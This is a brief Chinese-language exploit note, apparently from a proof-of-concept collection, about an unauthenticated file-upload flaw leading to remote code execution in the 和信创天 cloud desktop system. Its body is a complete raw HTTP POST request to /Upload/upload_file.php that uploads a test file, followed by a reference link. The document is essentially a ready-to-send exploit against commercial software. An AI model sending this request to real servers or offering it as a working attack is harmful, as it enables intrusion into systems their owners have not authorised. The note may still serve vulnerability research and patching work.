# 和信创天云桌面系统命令执行，文件上传 全版本 RCE

poc：

```
POST /Upload/upload_file.php?l=1 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Referer: x.x.x.x
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
Content-Length: 164

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/avif

1
------WebKitFormBoundaryfcKRltGv--
```

参考：https://forum.butian.net/share/80